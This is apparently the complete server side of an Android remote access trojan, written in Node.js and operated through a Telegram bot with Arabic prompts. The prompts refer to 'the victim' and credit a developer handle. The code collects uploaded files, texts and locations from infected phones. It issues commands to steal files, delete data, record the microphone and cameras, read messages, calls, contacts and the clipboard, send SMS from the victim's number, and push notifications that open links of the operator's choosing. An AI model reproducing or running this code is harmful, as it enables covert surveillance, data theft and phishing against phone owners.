const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = process.env.TELEGRAM_BOT_TOKEN;
const id = parseInt(process.env.ADMIN_ID);
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new WebSocket.Server({ server: appServer });
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : .  ᴠɪᴘ المطور : @OX_U1</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    const name = req.file.originalname;
    appBot.sendDocument(
        id,
        req.file.buffer,
        {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: 'HTML',
        },
        {
            filename: name,
            contentType: 'application/txt',
        }
    );
    res.send('');
});

app.post('/uploadText', (req, res) => {
    appBot.sendMessage(
        id,
        `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'],
        { parse_mode: 'HTML' }
    );
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, { parse_mode: 'HTML' });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });

    appBot.sendMessage(
        id,
        `°• جهاز جديد متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    );

    ws.on('close', () => {
        appBot.sendMessage(
            id,
            `°• لا يوجد جهاز متصل\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• نظام الاندرويد : <b>${version}</b>\n` +
                `• سطوح الشاشة : <b>${brightness}</b>\n` +
                `• مزود : <b>${provider}</b>`,
            { parse_mode: 'HTML' }
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (!message.text) return;

    if (message.reply_to_message) {
        const repliedText = message.reply_to_message.text || '';

        if (repliedText.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text;
            appBot.sendMessage(
                id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                    '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                { reply_markup: { force_reply: true } }
            );
        }

        if (repliedText.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية')) {
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل مسار الملف الذي تريد ') && !repliedText.includes('سحبة')) {
            const path = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            currentTitle = message.text;
            appBot.sendMessage(
                id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
                    '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                { reply_markup: { force_reply: true } }
            );
        }

        if (repliedText.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (repliedText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text;
            appSocket.clients.forEach((ws) => {
                if (ws.uuid === currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                    '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }
    }

    if (id === chatId) {
        if (message.text === '/start') {
            appBot.sendMessage(
                id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت .  ᴠɪᴘ المطور : @OX_U1\n\n' +
                    '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
                    '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر\n\n' +
                    '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n' +
                    '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                        resize_keyboard: true,
                    },
                }
            );
        }

        if (message.text === 'الاجهزة المتصلة') {
            if (appClients.size === 0) {
                appBot.sendMessage(
                    id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                        '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                );
            } else {
                let text = '°• قائمة الاجهزة المتصلة :\n\n';
                appClients.forEach((value) => {
                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                        `• البطارية : <b>${value.battery}</b>\n` +
                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                        `• مزود : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: 'HTML' });
            }
        }

        if (message.text === 'تنفيذ الامر') {
            if (appClients.size === 0) {
                appBot.sendMessage(
                    id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                        '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach((value, key) => {
                    deviceListKeyboard.push([
                        { text: value.model, callback_data: 'device:' + key },
                    ]);
                });
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    reply_markup: {
                        inline_keyboard: deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الاذن مرفوض');
    }
});

appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [commend, uuid] = data.split(':');

    if (commend === 'device') {
        const client = appClients.get(uuid);
        if (!client) {
            appBot.answerCallbackQuery(callbackQuery.id, 'الجهاز غير متصل');
            return;
        }
        appBot.editMessageText(`°• حدد الأداة للجهاز : <b>${client.model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                        { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` },
                    ],
                    [
                        { text: 'الحصول على الملفات', callback_data: `file:${uuid}` },
                        { text: 'حذف ملف', callback_data: `delete_file:${uuid}` },
                    ],
                    [
                        { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                        { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                    ],
                    [
                        { text: 'الكاميرا الخلفية', callback_data: `camera_main:${uuid}` },
                        { text: 'الكاميرا السلفي', callback_data: `camera_selfie:${uuid}` },
                    ],
                    [
                        { text: 'الموقع', callback_data: `location:${uuid}` },
                        { text: 'نخب', callback_data: `toast:${uuid}` },
                    ],
                    [
                        { text: 'المكالمات', callback_data: `calls:${uuid}` },
                        { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` },
                    ],
                    [
                        { text: 'يهتز', callback_data: `vibrate:${uuid}` },
                        { text: 'إظهار الإشعارات', callback_data: `show_notification:${uuid}` },
                    ],
                    [
                        { text: 'الرسائل', callback_data: `messages:${uuid}` },
                        { text: 'ارسال رسالة', callback_data: `send_message:${uuid}` },
                    ],
                    [
                        { text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}` },
                        { text: 'إيقاف الملف الصوتي', callback_data: `stop_audio:${uuid}` },
                    ],
                    [
                        {
                            text: 'ارسال رسالة لجميع جهات الاتصال',
                            callback_data: `send_message_to_all:${uuid}`,
                        },
                    ],
                ],
            },
            parse_mode: 'HTML',
        });
    }

    const pendingCommands = [
        'calls', 'contacts', 'messages', 'apps', 'device_info',
        'clipboard', 'camera_main', 'camera_selfie', 'location',
        'vibrate', 'stop_audio'
    ];

    if (pendingCommands.includes(commend)) {
        appSocket.clients.forEach((ws) => {
            if (ws.uuid === uuid) {
                ws.send(commend);
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور .  ᴠɪᴘ المطور : @OX_U1 ،',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['الاجهزة المتصلة'], ['تنفيذ الامر']],
                    resize_keyboard: true,
                },
            }
        );
    }

    const forceReplyCommands = {
        send_message:
            '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
        send_message_to_all:
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
        file:
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
        delete_file:
            '°• ادخل مسار الملف الذي تريد حذفه\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
        microphone:
            '°• ادخل المدة الذي تريد تسجيل صوت الضحية\n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
        toast:
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
        show_notification:
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
        play_audio:
            '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
    };

    if (forceReplyCommands[commend]) {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, forceReplyCommands[commend], {
            reply_markup: { force_reply: true },
            parse_mode: 'HTML',
        });
        currentUuid = uuid;
    }
});

setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send('ping');
        }
    });
    try {
        axios.get(address, { timeout: 4000 }).catch(() => {});
    } catch (e) {
        // ignore
    }
}, 5000);

appServer.listen(process.env.PORT || 8999, () => {
    console.log(`Server running on port ${process.env.PORT || 8999}`);
});
